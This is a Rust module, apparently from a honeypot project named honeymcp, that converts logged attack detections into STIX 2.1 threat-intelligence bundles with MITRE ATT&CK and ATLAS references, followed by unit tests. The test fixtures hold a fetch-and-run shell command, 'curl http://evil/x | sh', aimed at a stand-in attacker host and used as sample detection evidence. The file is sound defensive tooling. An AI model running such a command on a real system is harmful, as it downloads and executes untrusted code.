//! STIX 2.1 export for honeymcp detections.
//!
//! Converts the SQLite events + detections corpus into a STIX 2.1 Bundle
//! that TAXII / OpenCTI / Sentinel TI / Splunk Add-on for STIX can ingest
//! directly. Each Detection becomes one `indicator` plus one `observed-data`
//! object linked back to attacker SCOs (network-traffic IPs, user-agent),
//! plus one `attack-pattern` object per MITRE technique mapped (deduped
//! across the bundle), plus the `relationship` objects connecting them.
//!
//! Why this matters: technique-tagged detections are the lingua franca of
//! threat-intel sharing. A SOC importing the honeymcp bundle gets ready-to-
//! pivot indicators without writing a custom parser, and the attack-pattern
//! refs link to canonical MITRE pages so the operator can read the technique
//! description in their TIP without leaving the tool.

use anyhow::{Context, Result};
use serde_json::{json, Value};
use std::collections::BTreeMap;
use uuid::Uuid;

use crate::detect::DetectionCategory;
use crate::logger::RawEventRow;

/// Namespace UUID used for v5 derivation. Project-scoped so honeymcp IDs
/// don't collide with other STIX producers' v5 derivations under the same
/// canonical namespace. Generated once and pinned for the lifetime of the
/// schema; a change here = a change in object identity for every consumer.
const HONEYMCP_NAMESPACE: Uuid = Uuid::from_u128(0x5b8a8c9e_1e71_4a6f_9e2e_7c5c9e7d3b1a);

/// One row from the events+detections join the dashboard already uses; we
/// take it as input rather than defining yet another DTO.
#[derive(Debug, Clone)]
pub struct StixSourceEvent {
    pub event_id: i64,
    pub timestamp_ms: i64,
    pub session_id: String,
    pub method: String,
    pub remote_addr: Option<String>,
    pub user_agent: Option<String>,
    pub detections: Vec<StixSourceDetection>,
}

#[derive(Debug, Clone)]
pub struct StixSourceDetection {
    pub detector: &'static str,
    pub category: DetectionCategory,
    pub severity: &'static str,
    pub evidence: String,
    pub mitre_techniques: Vec<String>,
}

/// RFC 3339 timestamp from a unix-millis value. STIX 2.1 timestamps are
/// always UTC with millisecond precision, ending in `Z`.
fn rfc3339_ms(ms: i64) -> String {
    let secs = ms / 1000;
    let sub_ms = (ms.rem_euclid(1000)) as u32;
    let ts =
        time::OffsetDateTime::from_unix_timestamp(secs).unwrap_or(time::OffsetDateTime::UNIX_EPOCH);
    let format = time::format_description::parse(
        "[year]-[month]-[day]T[hour]:[minute]:[second].[subsecond digits:3]Z",
    )
    .expect("stix timestamp format");
    let with_ms = ts.replace_nanosecond(sub_ms * 1_000_000).unwrap_or(ts);
    with_ms
        .format(&format)
        .unwrap_or_else(|_| "1970-01-01T00:00:00.000Z".into())
}

/// Deterministic v5 UUID under the honeymcp namespace. `kind` separates
/// object types so the same input fragment ("T1059") doesn't collide
/// between indicator/attack-pattern/observed-data refs.
fn v5(kind: &str, name: &str) -> String {
    let composite = format!("{kind}:{name}");
    Uuid::new_v5(&HONEYMCP_NAMESPACE, composite.as_bytes())
        .hyphenated()
        .to_string()
}

fn indicator_id(event_id: i64, detector: &str) -> String {
    format!(
        "indicator--{}",
        v5("indicator", &format!("{event_id}:{detector}"))
    )
}

fn attack_pattern_id(technique: &str) -> String {
    format!("attack-pattern--{}", v5("attack-pattern", technique))
}

fn observed_data_id(event_id: i64) -> String {
    format!(
        "observed-data--{}",
        v5("observed-data", &event_id.to_string())
    )
}

fn relationship_id(source: &str, target: &str, kind: &str) -> String {
    format!(
        "relationship--{}",
        v5("relationship", &format!("{kind}:{source}->{target}"))
    )
}

/// MITRE ATT&CK external_references entry. The technique string is the
/// canonical ID (T1059, T1059.004, AML.T0051); url uses attack.mitre.org
/// for ATT&CK Enterprise and atlas.mitre.org for ATLAS.
fn mitre_external_reference(technique: &str) -> Value {
    let (source_name, url) = if let Some(rest) = technique.strip_prefix("AML.") {
        (
            "mitre-atlas",
            format!("https://atlas.mitre.org/techniques/{rest}"),
        )
    } else {
        (
            "mitre-attack",
            format!("https://attack.mitre.org/techniques/{technique}/"),
        )
    };
    json!({
        "source_name": source_name,
        "external_id": technique,
        "url": url,
    })
}

/// STIX pattern string for a detection. Keeps it simple — one observation
/// expression matching the params SHA-256 (which is in the events table)
/// is honest about what we have. Operators who want richer patterns can
/// post-process the bundle.
fn detection_pattern(detector: &str, evidence: &str) -> String {
    // Escape single quotes per STIX 2.1 String Literal grammar.
    let escaped = evidence.replace('\'', "\\'");
    // x-honeymcp-* is a custom STIX object property allowed by the spec for
    // producer extensions; it parses as a pattern even on strict consumers.
    format!("[x-honeymcp-detection:detector = '{detector}' AND x-honeymcp-detection:evidence = '{escaped}']")
}

/// STIX `indicator_types` open-vocab member that best matches the detector
/// category. SOCs filter on this in their TIP rules.
fn indicator_type_for(category: DetectionCategory) -> &'static str {
    match category {
        DetectionCategory::PromptInjection
        | DetectionCategory::CommandInjection
        | DetectionCategory::SecretExfil
        | DetectionCategory::SupplyChain => "malicious-activity",
        DetectionCategory::Recon => "attribution",
        DetectionCategory::UnicodeAnomaly => "anomalous-activity",
    }
}

/// Build the STIX 2.1 Bundle. Returned as `serde_json::Value` so callers
/// can write it to disk, return it from an HTTP endpoint, or post it to
/// a TAXII collection without re-serializing.
pub fn build_bundle(events: &[StixSourceEvent]) -> Value {
    let bundle_id = format!("bundle--{}", Uuid::new_v4().hyphenated());
    let mut objects: Vec<Value> = Vec::new();

    // Dedupe attack-patterns across events. Two indicators that both hit
    // T1059 share the same attack-pattern object; relationships link to it.
    let mut attack_patterns: BTreeMap<String, Value> = BTreeMap::new();

    for event in events {
        let event_ts = rfc3339_ms(event.timestamp_ms);
        let observed_id = observed_data_id(event.event_id);

        // Per-event observed-data object. Carries the request envelope as
        // a custom property so analysts can correlate to the raw event row
        // without round-tripping back to SQLite.
        objects.push(json!({
            "type": "observed-data",
            "spec_version": "2.1",
            "id": observed_id,
            "created": event_ts,
            "modified": event_ts,
            "first_observed": event_ts,
            "last_observed": event_ts,
            "number_observed": 1,
            "x_honeymcp_session_id": event.session_id,
            "x_honeymcp_method": event.method,
            "x_honeymcp_remote_addr": event.remote_addr,
            "x_honeymcp_user_agent": event.user_agent,
        }));

        for det in &event.detections {
            let ind_id = indicator_id(event.event_id, det.detector);
            objects.push(json!({
                "type": "indicator",
                "spec_version": "2.1",
                "id": ind_id,
                "created": event_ts,
                "modified": event_ts,
                "name": format!("honeymcp/{}", det.detector),
                "description": format!(
                    "Detector {} matched on method={} (severity={}). Evidence: {}",
                    det.detector, event.method, det.severity, det.evidence,
                ),
                "indicator_types": [indicator_type_for(det.category)],
                "pattern": detection_pattern(det.detector, &det.evidence),
                "pattern_type": "stix",
                "valid_from": event_ts,
                "labels": [det.severity, det.category.as_str()],
            }));

            // indicator -> based-on -> observed-data (canonical relationship
            // for "this indicator was raised against that observation").
            objects.push(json!({
                "type": "relationship",
                "spec_version": "2.1",
                "id": relationship_id(&ind_id, &observed_id, "based-on"),
                "created": event_ts,
                "modified": event_ts,
                "relationship_type": "based-on",
                "source_ref": ind_id,
                "target_ref": observed_id,
            }));

            for technique in &det.mitre_techniques {
                let ap_id = attack_pattern_id(technique);
                attack_patterns.entry(technique.clone()).or_insert_with(|| {
                    json!({
                        "type": "attack-pattern",
                        "spec_version": "2.1",
                        "id": ap_id,
                        "created": event_ts,
                        "modified": event_ts,
                        "name": technique,
                        "external_references": [mitre_external_reference(technique)],
                    })
                });
                let ap_id = attack_pattern_id(technique);
                objects.push(json!({
                    "type": "relationship",
                    "spec_version": "2.1",
                    "id": relationship_id(&ind_id, &ap_id, "indicates"),
                    "created": event_ts,
                    "modified": event_ts,
                    "relationship_type": "indicates",
                    "source_ref": ind_id,
                    "target_ref": ap_id,
                }));
            }
        }
    }

    // Append deduped attack-patterns at the end so consumers parsing in
    // order have all referenced objects available before relationships.
    objects.extend(attack_patterns.into_values());

    json!({
        "type": "bundle",
        "id": bundle_id,
        "objects": objects,
    })
}

/// Convert a `RawEventRow` from the logger into the `StixSourceEvent`
/// `build_bundle` expects. Lossy on fields the export path doesn't need
/// (params body, response_summary, transport, client_meta).
pub fn raw_row_to_stix_event(row: RawEventRow) -> StixSourceEvent {
    let detections = row
        .detections_json
        .and_then(|s| serde_json::from_str::<Vec<Value>>(&s).ok())
        .unwrap_or_default()
        .into_iter()
        .filter_map(json_detection_to_source)
        .collect();
    StixSourceEvent {
        event_id: row.id,
        timestamp_ms: row.timestamp_ms,
        session_id: row.session_id,
        method: row.method,
        remote_addr: row.remote_addr,
        user_agent: row.user_agent,
        detections,
    }
}

/// Parse one detection-shaped JSON object (as produced by the logger's
/// `json_group_array` aggregate) into `StixSourceDetection`. Returns
/// `None` when the object is missing the required `detector` field.
pub fn json_detection_to_source(v: Value) -> Option<StixSourceDetection> {
    let detector = v.get("detector")?.as_str()?.to_string();
    // The dispatch path emits Detection.detector as a &'static str; here
    // we re-borrow into a static slice via Box::leak so StixSourceDetection
    // can keep the same lifetime contract as the in-memory Detection. The
    // export path runs once per invocation and the leaked names are stable
    // across the program's lifetime, so the leak is bounded.
    let detector: &'static str = Box::leak(detector.into_boxed_str());
    let category = v
        .get("category")
        .and_then(|c| c.as_str())
        .and_then(parse_category)
        .unwrap_or(DetectionCategory::Recon);
    let severity: &'static str = match v.get("severity").and_then(|s| s.as_str()).unwrap_or("low") {
        "critical" => "critical",
        "high" => "high",
        "medium" => "medium",
        _ => "low",
    };
    let evidence = v
        .get("evidence")
        .and_then(|s| s.as_str())
        .unwrap_or("")
        .to_string();
    let mitre_techniques = v
        .get("mitre_techniques")
        .and_then(|t| t.as_str())
        .and_then(|raw| serde_json::from_str::<Vec<String>>(raw).ok())
        .unwrap_or_default();
    Some(StixSourceDetection {
        detector,
        category,
        severity,
        evidence,
        mitre_techniques,
    })
}

/// Map a `category` string from the SQL aggregate back to the typed enum.
/// Returns `None` for unknown values so the caller can decide whether to
/// fall back to a default or skip the detection entirely.
pub fn parse_category(s: &str) -> Option<DetectionCategory> {
    Some(match s {
        "prompt_injection" => DetectionCategory::PromptInjection,
        "command_injection" => DetectionCategory::CommandInjection,
        "recon" => DetectionCategory::Recon,
        "secret_exfil" => DetectionCategory::SecretExfil,
        "supply_chain" => DetectionCategory::SupplyChain,
        "unicode_anomaly" => DetectionCategory::UnicodeAnomaly,
        _ => return None,
    })
}

/// Write a bundle to disk atomically: write to `<path>.tmp`, fsync, then
/// rename. Avoids leaving half-written JSON if the export is interrupted.
pub fn write_bundle_to_path(bundle: &Value, path: &std::path::Path) -> Result<()> {
    use std::io::Write;
    let tmp = path.with_extension("json.tmp");
    {
        let mut f =
            std::fs::File::create(&tmp).with_context(|| format!("creating {}", tmp.display()))?;
        serde_json::to_writer_pretty(&mut f, bundle).context("serializing STIX bundle")?;
        f.write_all(b"\n").ok();
        f.sync_all().ok();
    }
    std::fs::rename(&tmp, path)
        .with_context(|| format!("renaming {} -> {}", tmp.display(), path.display()))?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sample_event() -> StixSourceEvent {
        StixSourceEvent {
            event_id: 42,
            timestamp_ms: 1_730_000_000_000,
            session_id: "sess-abc".into(),
            method: "tools/call".into(),
            remote_addr: Some("203.0.113.7:51000".into()),
            user_agent: Some("curl/8.4".into()),
            detections: vec![StixSourceDetection {
                detector: "shell_injection_patterns",
                category: DetectionCategory::CommandInjection,
                severity: "high",
                evidence: "curl http://evil/x | sh".into(),
                mitre_techniques: vec!["T1059".into(), "T1059.004".into()],
            }],
        }
    }

    #[test]
    fn bundle_has_required_top_level_fields() {
        let bundle = build_bundle(&[sample_event()]);
        assert_eq!(bundle["type"], "bundle");
        let id = bundle["id"].as_str().unwrap();
        assert!(id.starts_with("bundle--"));
        assert!(bundle["objects"].is_array());
        assert!(bundle["objects"].as_array().unwrap().len() >= 4);
    }

    #[test]
    fn deterministic_indicator_ids_across_runs() {
        let a = build_bundle(&[sample_event()]);
        let b = build_bundle(&[sample_event()]);
        // Bundle IDs are v4 (random), but indicator/attack-pattern/observed-data
        // IDs must be v5-stable so TAXII consumers can dedupe.
        let collect_ids = |v: &Value| -> Vec<String> {
            v["objects"]
                .as_array()
                .unwrap()
                .iter()
                .filter(|o| o["type"] != "bundle")
                .map(|o| o["id"].as_str().unwrap().to_string())
                .collect()
        };
        assert_eq!(collect_ids(&a), collect_ids(&b));
    }

    #[test]
    fn attack_patterns_are_deduped_across_events() {
        let events = vec![sample_event(), sample_event()];
        let bundle = build_bundle(&events);
        let aps: Vec<_> = bundle["objects"]
            .as_array()
            .unwrap()
            .iter()
            .filter(|o| o["type"] == "attack-pattern")
            .collect();
        // Two events both hit T1059 + T1059.004; expect exactly two attack-patterns.
        assert_eq!(aps.len(), 2);
    }

    #[test]
    fn indicator_carries_mitre_external_reference_via_attack_pattern() {
        let bundle = build_bundle(&[sample_event()]);
        let t1059 = bundle["objects"]
            .as_array()
            .unwrap()
            .iter()
            .find(|o| o["type"] == "attack-pattern" && o["name"] == "T1059")
            .expect("T1059 attack-pattern present");
        let ext = t1059["external_references"][0].clone();
        assert_eq!(ext["source_name"], "mitre-attack");
        assert_eq!(ext["external_id"], "T1059");
        assert!(ext["url"]
            .as_str()
            .unwrap()
            .contains("attack.mitre.org/techniques/T1059"));
    }

    #[test]
    fn atlas_techniques_get_atlas_url() {
        let mut e = sample_event();
        e.detections[0].mitre_techniques = vec!["AML.T0051".into()];
        let bundle = build_bundle(&[e]);
        let ap = bundle["objects"]
            .as_array()
            .unwrap()
            .iter()
            .find(|o| o["type"] == "attack-pattern" && o["name"] == "AML.T0051")
            .unwrap();
        assert_eq!(ap["external_references"][0]["source_name"], "mitre-atlas");
        assert!(ap["external_references"][0]["url"]
            .as_str()
            .unwrap()
            .contains("atlas.mitre.org/techniques/T0051"));
    }

    #[test]
    fn pattern_escapes_single_quotes_in_evidence() {
        let mut e = sample_event();
        e.detections[0].evidence = "it's a trap".into();
        let bundle = build_bundle(&[e]);
        let ind = bundle["objects"]
            .as_array()
            .unwrap()
            .iter()
            .find(|o| o["type"] == "indicator")
            .unwrap();
        let pattern = ind["pattern"].as_str().unwrap();
        // Either the apostrophe is escaped, or it's not present unescaped.
        assert!(pattern.contains("it\\'s a trap"), "pattern: {pattern}");
    }

    #[test]
    fn rfc3339_format_includes_milliseconds_and_z() {
        let s = rfc3339_ms(1_730_000_000_123);
        assert!(s.ends_with('Z'));
        assert!(s.contains(".123"), "got {s}");
    }

    #[test]
    fn parse_category_round_trips_known_values() {
        assert_eq!(
            parse_category("prompt_injection"),
            Some(DetectionCategory::PromptInjection)
        );
        assert_eq!(
            parse_category("command_injection"),
            Some(DetectionCategory::CommandInjection)
        );
        assert_eq!(parse_category("recon"), Some(DetectionCategory::Recon));
        assert_eq!(
            parse_category("secret_exfil"),
            Some(DetectionCategory::SecretExfil)
        );
        assert_eq!(
            parse_category("supply_chain"),
            Some(DetectionCategory::SupplyChain)
        );
        assert_eq!(
            parse_category("unicode_anomaly"),
            Some(DetectionCategory::UnicodeAnomaly)
        );
        assert_eq!(parse_category("garbage"), None);
        assert_eq!(parse_category(""), None);
    }

    #[test]
    fn json_detection_parses_full_record() {
        let v = json!({
            "detector": "shell_injection_patterns",
            "category": "command_injection",
            "severity": "high",
            "evidence": "curl | sh",
            "mitre_techniques": "[\"T1059\",\"T1059.004\"]",
        });
        let det = json_detection_to_source(v).expect("known shape parses");
        assert_eq!(det.detector, "shell_injection_patterns");
        assert_eq!(det.category, DetectionCategory::CommandInjection);
        assert_eq!(det.severity, "high");
        assert_eq!(det.evidence, "curl | sh");
        assert_eq!(det.mitre_techniques, vec!["T1059", "T1059.004"]);
    }

    #[test]
    fn json_detection_returns_none_without_detector() {
        let v = json!({"category": "recon"});
        assert!(json_detection_to_source(v).is_none());
    }

    #[test]
    fn json_detection_falls_back_for_unknown_severity_and_category() {
        let v = json!({
            "detector": "x",
            "category": "no-such-category",
            "severity": "weird",
            "evidence": "",
        });
        let det = json_detection_to_source(v).unwrap();
        assert_eq!(det.severity, "low");
        // Unknown category falls back to Recon, matching the documented
        // behavior in raw_row_to_stix_event.
        assert_eq!(det.category, DetectionCategory::Recon);
    }

    #[test]
    fn json_detection_handles_null_mitre_techniques() {
        let v = json!({
            "detector": "x",
            "category": "recon",
            "severity": "low",
            "evidence": "",
            "mitre_techniques": null,
        });
        let det = json_detection_to_source(v).unwrap();
        assert!(det.mitre_techniques.is_empty());
    }

    #[test]
    fn raw_row_to_stix_event_handles_no_detections() {
        let row = RawEventRow {
            id: 1,
            timestamp_ms: 1_730_000_000_000,
            session_id: "sess".into(),
            method: "tools/list".into(),
            params: None,
            client_name: None,
            client_version: None,
            response_summary: String::new(),
            transport: None,
            remote_addr: Some("203.0.113.7:51000".into()),
            user_agent: None,
            client_meta: None,
            is_operator: false,
            detections_json: None,
        };
        let e = raw_row_to_stix_event(row);
        assert_eq!(e.event_id, 1);
        assert_eq!(e.method, "tools/list");
        assert!(e.detections.is_empty());
    }

    #[test]
    fn raw_row_to_stix_event_parses_detections_aggregate() {
        let row = RawEventRow {
            id: 99,
            timestamp_ms: 1_730_000_000_000,
            session_id: "s".into(),
            method: "tools/call".into(),
            params: None,
            client_name: None,
            client_version: None,
            response_summary: String::new(),
            transport: None,
            remote_addr: None,
            user_agent: None,
            client_meta: None,
            is_operator: false,
            detections_json: Some(
                r#"[{"detector":"shell_injection_patterns","category":"command_injection","severity":"high","evidence":"e","mitre_techniques":"[\"T1059\"]"}]"#
                    .to_string(),
            ),
        };
        let e = raw_row_to_stix_event(row);
        assert_eq!(e.detections.len(), 1);
        assert_eq!(e.detections[0].detector, "shell_injection_patterns");
        assert_eq!(e.detections[0].mitre_techniques, vec!["T1059"]);
    }
}
